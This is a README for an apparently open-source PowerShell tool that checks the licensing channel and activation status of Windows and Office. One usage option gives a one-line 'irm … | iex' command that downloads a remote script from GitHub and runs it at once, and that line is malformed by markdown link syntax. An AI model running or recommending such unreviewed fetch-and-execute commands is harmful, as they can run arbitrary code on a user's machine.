# Windows & Office Genuine Activation Checker 🔍

A lightweight, open-source, 1-click utility to verify the authenticity and licensing channel of your **Windows (10/11)** and **Microsoft Office (2013–2024/365)** installations.

Many users unknowingly use cracked or temporary KMS/Volume licenses that expire after 180 days or pose security risks. This tool queries the Windows Software Licensing Management database (`SoftwareLicensingProduct`) to display a clean, color-coded summary of your license channel, partial product key, and expiration status.

## ✨ Features
- **100% Safe & Open-Source:** Pure PowerShell & Batch scripts—no `.exe` files, no third-party DLLs, no background processes.
- **Channel Detection:** Instantly identifies **Retail (Genuine)**, **OEM (Genuine)**, or **Volume (KMS/MAK)** channels.
- **Expiration Check:** Verifies whether your PC is permanently activated or running on a temporary KMS activator.
- **Office & Windows Support:** Automatically detects both Windows OS and Microsoft Office installations in a single table.

## 🚀 How to Use

### Option 1: 1-Click Run (Recommended)
1. Click the green **`<> Code`** button above and select **Download ZIP** (or download from the [Releases](../../releases) page).
2. Extract the folder and double-click **`Run-Checker.bat`**.
3. View your color-coded Windows and Office license status in the terminal window.

### Option 2: Run Directly via PowerShell
Open **PowerShell** and run this single command:
```powershell
irm [https://raw.githubusercontent.com/PyTopCoder/Windows-Office-Activation-Checker/main/Check-Activation-Status.ps1](https://raw.githubusercontent.com/PyTopCoder/Windows-Office-Activation-Checker/main/Check-Activation-Status.ps1) | iex
